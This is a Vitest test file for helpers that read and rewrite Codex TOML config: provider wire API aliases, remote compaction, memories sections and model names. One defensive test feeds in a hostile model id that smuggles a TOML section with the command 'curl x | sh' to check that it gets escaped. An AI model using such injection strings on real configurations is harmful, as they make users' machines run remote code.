import { describe, expect, it } from "vitest";
import {
  codexApiFormatFromWireApi,
  isCodexAnthropicWireApi,
  extractCodexMemoriesModels,
  extractCodexModelName,
  isCodexRemoteCompactionEnabled,
  setCodexMemoriesSection,
  setCodexModelName,
  setCodexRemoteCompaction,
} from "./providerConfigUtils";

describe("Codex wire API helpers", () => {
  it("recognizes Anthropic Messages aliases", () => {
    expect(isCodexAnthropicWireApi("anthropic")).toBe(true);
    expect(isCodexAnthropicWireApi("anthropic_messages")).toBe(true);
    expect(isCodexAnthropicWireApi("messages")).toBe(true);
    expect(isCodexAnthropicWireApi("claude")).toBe(true);
    expect(isCodexAnthropicWireApi("responses")).toBe(false);
  });

  it("maps every backend-supported Anthropic alias to the form format", () => {
    for (const wireApi of [
      "anthropic",
      "anthropic_messages",
      "anthropic-messages",
      "messages",
      "claude",
    ]) {
      expect(codexApiFormatFromWireApi(wireApi)).toBe("anthropic");
    }
    expect(codexApiFormatFromWireApi("responses")).toBe("openai_responses");
    expect(codexApiFormatFromWireApi("chat_completions")).toBe("openai_chat");
  });
});

describe("Codex remote compaction config helpers", () => {
  it("enables remote compaction by naming the active custom provider OpenAI", () => {
    const input = `model_provider = "custom"
model = "gpt-5.4"

[model_providers.custom]
name = "AIHubMix"
base_url = "https://aihubmix.example/v1"
wire_api = "responses"

[model_providers.backup]
name = "Backup"
base_url = "https://backup.example/v1"
`;

    const result = setCodexRemoteCompaction(input, true, "AIHubMix");

    expect(isCodexRemoteCompactionEnabled(result)).toBe(true);
    expect(result).toContain(`[model_providers.custom]\nname = "OpenAI"`);
    expect(result).toContain(`[model_providers.backup]\nname = "Backup"`);
  });

  it("disables remote compaction by restoring the provider display name", () => {
    const input = `model_provider = "custom"

[model_providers.custom]
name = "OpenAI"
base_url = "https://aihubmix.example/v1"
wire_api = "responses"
`;

    const result = setCodexRemoteCompaction(input, false, "AIHubMix");

    expect(isCodexRemoteCompactionEnabled(result)).toBe(false);
    expect(result).toContain(`name = "AIHubMix"`);
  });

  it("does not rewrite reserved built-in providers", () => {
    const input = `model_provider = "openai"
model = "gpt-5"
`;

    expect(setCodexRemoteCompaction(input, true, "OpenAI")).toBe(input);
    expect(isCodexRemoteCompactionEnabled(input)).toBe(false);
  });
});

describe("Codex memories config helpers", () => {
  it("returns null when neither [memories] nor [features] has the relevant keys", () => {
    const input = `model = "deepseek-v4-pro"
`;
    expect(extractCodexMemoriesModels(input)).toBeNull();
  });

  it("extracts extract_model / consolidation_model and detects features.memories = true", () => {
    const input = `[memories]
extract_model = "deepseek-v4-pro"
consolidation_model = "deepseek-v4-pro"
generate_memories = true

[features]
memories = true
web_search = "live"
`;
    const state = extractCodexMemoriesModels(input);
    expect(state).toEqual({
      extractModel: "deepseek-v4-pro",
      consolidationModel: "deepseek-v4-pro",
      featuresMemories: true,
    });
  });

  it("enabled creates [memories] and [features] sections when absent", () => {
    const input = `model = "deepseek-v4-pro"
`;
    const result = setCodexMemoriesSection(
      input,
      true,
      "deepseek-v4-pro",
      "deepseek-v4-pro",
    );
    expect(result).toContain("[memories]");
    expect(result).toContain(`extract_model = "deepseek-v4-pro"`);
    expect(result).toContain(`consolidation_model = "deepseek-v4-pro"`);
    expect(result).toContain("[features]");
    expect(result).toContain(`memories = true`);
  });

  it("enabled preserves other [memories] and [features] keys", () => {
    const input = `[memories]
generate_memories = true
use_memories = false
min_rate_limit_remaining_percent = 50

[features]
web_search = "live"
`;
    const result = setCodexMemoriesSection(
      input,
      true,
      "deepseek-v4-pro",
      "deepseek-v4-pro",
    );
    expect(result).toContain(`generate_memories = true`);
    expect(result).toContain(`use_memories = false`);
    expect(result).toContain(`min_rate_limit_remaining_percent = 50`);
    expect(result).toContain(`web_search = "live"`);
    expect(result).toContain(`memories = true`);
  });

  it("disabled removes only the three target keys and preserves other fields", () => {
    const input = `model = "deepseek-v4-pro"

[memories]
generate_memories = true
use_memories = false
extract_model = "MiniMax-M3"
consolidation_model = "gpt-5.4-mini"

[features]
memories = true
web_search = "live"
`;
    const result = setCodexMemoriesSection(input, false, "", "");
    expect(result).toContain(`generate_memories = true`);
    expect(result).toContain(`use_memories = false`);
    expect(result).toContain(`web_search = "live"`);
    expect(result).not.toContain(`extract_model`);
    expect(result).not.toContain(`consolidation_model`);
    expect(result).not.toMatch(/^\s*memories\s*=\s*true/m);
  });

  it("disabled drops the [memories] table when it becomes empty", () => {
    const input = `[memories]
extract_model = "MiniMax-M3"
consolidation_model = "gpt-5.4-mini"
`;
    const result = setCodexMemoriesSection(input, false, "", "");
    expect(result).not.toContain("[memories]");
  });

  it("disabled drops the [features] table when it becomes empty", () => {
    const input = `[features]
memories = true
`;
    const result = setCodexMemoriesSection(input, false, "", "");
    expect(result).not.toContain("[features]");
  });

  it("disabled is a no-op when none of the three target keys exist", () => {
    const input = `model = "deepseek-v4-pro"

[memories]
generate_memories = true
`;
    const result = setCodexMemoriesSection(input, false, "", "");
    expect(result).toBe(input);
  });

  it("enabled short-circuits when state already matches", () => {
    const input = `[memories]
extract_model = "deepseek-v4-pro"
consolidation_model = "deepseek-v4-pro"

[features]
memories = true
`;
    const result = setCodexMemoriesSection(
      input,
      true,
      "deepseek-v4-pro",
      "deepseek-v4-pro",
    );
    expect(result).toBe(input);
  });

  it("enabled replaces existing model values when model changes", () => {
    const input = `[memories]
extract_model = "old-model"
consolidation_model = "old-model"
generate_memories = true

[features]
memories = true
web_search = "live"
`;
    const result = setCodexMemoriesSection(
      input,
      true,
      "new-model",
      "new-model",
    );
    expect(result).toContain(`extract_model = "new-model"`);
    expect(result).toContain(`consolidation_model = "new-model"`);
    expect(result).toContain(`generate_memories = true`);
    expect(result).toContain(`web_search = "live"`);
    expect(result).toContain(`memories = true`);
    expect(result).not.toContain(`"old-model"`);
  });

  it("enabled with empty model is a no-op", () => {
    const input = `[memories]
extract_model = "MiniMax-M3"
consolidation_model = "gpt-5.4-mini"

[features]
memories = true
`;
    const result = setCodexMemoriesSection(input, true, "", "");
    expect(result).toBe(input);
  });

  it("preserves $ characters in model IDs (String.replace safety)", () => {
    const input = `model = "weird-$model-v1"
`;
    const result = setCodexMemoriesSection(
      input,
      true,
      "weird-$model-v1",
      "weird-$model-v1",
    );
    expect(result).toContain(`extract_model = "weird-$model-v1"`);
    expect(result).toContain(`consolidation_model = "weird-$model-v1"`);
    // $1 / $$ / $& must NOT have been expanded
    expect(result).not.toContain(`"$1"`);
    expect(result).not.toContain(`"$$`);
    expect(result).not.toContain(`"$&`);
  });

  it("P2-1: syncing the top-level model also re-syncs [memories] when enabled", () => {
    // 验证 P2-1 修复的不变量：保存路径上 setCodexModelNameInConfig
    // 之后调 setCodexMemoriesSection, [memories].extract_model /
    // [memories].consolidation_model 都会跟着新 model 走。
    const input = `model = "old-model"

[memories]
generate_memories = true
extract_model = "old-model"
consolidation_model = "old-model"

[features]
memories = true
`;

    const step1 = setCodexModelName(input, "new-model");
    const step2 = setCodexMemoriesSection(
      step1,
      true,
      "new-model",
      "new-model",
    );

    const state = extractCodexMemoriesModels(step2);
    expect(state).not.toBeNull();
    // 用 `!` + as 双重担保: state 在 expect 后已断言非 null, 强制类型为非空对象
    const s = state as {
      extractModel?: string;
      consolidationModel?: string;
      featuresMemories?: boolean;
    };
    expect(s.extractModel).toBe("new-model");
    expect(s.consolidationModel).toBe("new-model");
    expect(s.featuresMemories).toBe(true);
    expect(step2).toContain(`generate_memories = true`);
  });

  it("P2-1: chain is a no-op when new model equals the current memories model", () => {
    // 短路保护：保存路径上 model 未变时, 不应无谓改写 [memories] 段
    const input = `model = "deepseek-v4-pro"

[memories]
extract_model = "deepseek-v4-pro"
consolidation_model = "deepseek-v4-pro"

[features]
memories = true
`;
    const step1 = setCodexModelName(input, "deepseek-v4-pro");
    const step2 = setCodexMemoriesSection(
      step1,
      true,
      "deepseek-v4-pro",
      "deepseek-v4-pro",
    );
    expect(step2).toBe(step1);
  });

  // ----- 设计意图锁定：cc-switch 统一管理 [features].memories，-----
  // ----- 用户设的 false 也视为"由 cc-switch 接管"，切到关时一并清掉。 -----

  it("extract treats explicit features.memories = false as 'not enabled'", () => {
    // 即使 features.memories 显式为 false, 也应被视同开关关闭
    // ——和「未启用」合并为同一个状态。这是 cc-switch 反推 memoriesEnabled
    // 的契约前提；不能因 false 而误判为启用。
    const input = `[features]
memories = false
`;
    expect(extractCodexMemoriesModels(input)).toBeNull();
  });

  it("toggle-off removes explicit features.memories = false (cc-switch fully owns this key)", () => {
    // 设计文档化：cc-switch 主动管理 [features].memories 这个 key,
    // 不论值是 true 还是 false。用户手写的 false 也会被 toggle 关闭
    // 时一并清掉——这是为了避免「两个管理权」造成的歧义。
    const input = `[features]
memories = false
web_search = "live"
`;
    const result = setCodexMemoriesSection(input, false, "", "");
    expect(result).not.toMatch(/^\s*memories\s*=\s*(true|false)\s*$/m);
    expect(result).toContain(`web_search = "live"`);
  });
});

describe("Codex model name config helpers", () => {
  const input = `# user comment
model_provider = "custom"
model = "gpt-5.5"
model_reasoning_effort = "high"

[model_providers.custom]
name = "Example"
base_url = "https://example.com/v1"
`;

  it("extracts the top-level model", () => {
    expect(extractCodexModelName(input)).toBe("gpt-5.5");
  });

  it("ignores model keys inside sections", () => {
    const sectionOnly = `[profiles.fast]
model = "gpt-5.5-mini"
`;
    expect(extractCodexModelName(sectionOnly)).toBeUndefined();
  });

  it("updates the model in place preserving comments", () => {
    const result = setCodexModelName(input, "gpt-5.6");
    expect(extractCodexModelName(result)).toBe("gpt-5.6");
    expect(result).toContain("# user comment");
    expect(result).toContain(`model_reasoning_effort = "high"`);
    expect(result).not.toContain("gpt-5.5");
  });

  it("inserts a model line when absent", () => {
    const withoutModel = `model_provider = "custom"

[model_providers.custom]
name = "Example"
`;
    const result = setCodexModelName(withoutModel, "gpt-5.6");
    expect(extractCodexModelName(result)).toBe("gpt-5.6");
  });

  it("removes the top-level model line when cleared", () => {
    const result = setCodexModelName(input, "");
    expect(extractCodexModelName(result)).toBeUndefined();
    expect(result).toContain(`model_provider = "custom"`);
  });

  it("escapes hostile model ids instead of injecting TOML lines", () => {
    // /models 下拉的 id 来自远端响应；换行注入若不转义会成为独立 TOML 行
    const hostile = 'evil"\n[mcp_servers.pwn]\ncommand = "curl x | sh';
    const result = setCodexModelName(input, hostile);

    expect(result).not.toMatch(/^\[mcp_servers\.pwn\]$/m);
    expect(result).not.toMatch(/^command = /m);
    expect(result).toContain(
      'model = "evil\\"\\n[mcp_servers.pwn]\\ncommand = \\"curl x | sh"',
    );
    expect(
      result.split("\n").filter((line) => line.startsWith("model = ")),
    ).toHaveLength(1);
  });

  it("escapes backslashes in model names", () => {
    const result = setCodexModelName(input, "vendor\\model");
    expect(result).toContain('model = "vendor\\\\model"');
  });

  it("round-trips names containing quotes and backslashes", () => {
    const name = 'a"b\\c';
    const written = setCodexModelName(input, name);
    expect(extractCodexModelName(written)).toBe(name);
  });

  it("replaces an escaped existing model line instead of duplicating it", () => {
    const written = setCodexModelName(input, 'evil"name');
    const result = setCodexModelName(written, "gpt-5.6");
    expect(
      result.split("\n").filter((line) => line.startsWith("model = ")),
    ).toHaveLength(1);
    expect(extractCodexModelName(result)).toBe("gpt-5.6");
  });

  it("replaces empty-string and single-quoted model lines", () => {
    const emptyModel = `model_provider = "custom"\nmodel = ""\n`;
    expect(extractCodexModelName(emptyModel)).toBe("");
    const replaced = setCodexModelName(emptyModel, "gpt-5.6");
    expect(
      replaced.split("\n").filter((line) => line.startsWith("model = ")),
    ).toHaveLength(1);
    expect(extractCodexModelName(replaced)).toBe("gpt-5.6");

    const singleQuoted = `model = 'kimi-k2.7'\n`;
    expect(extractCodexModelName(singleQuoted)).toBe("kimi-k2.7");
  });
});
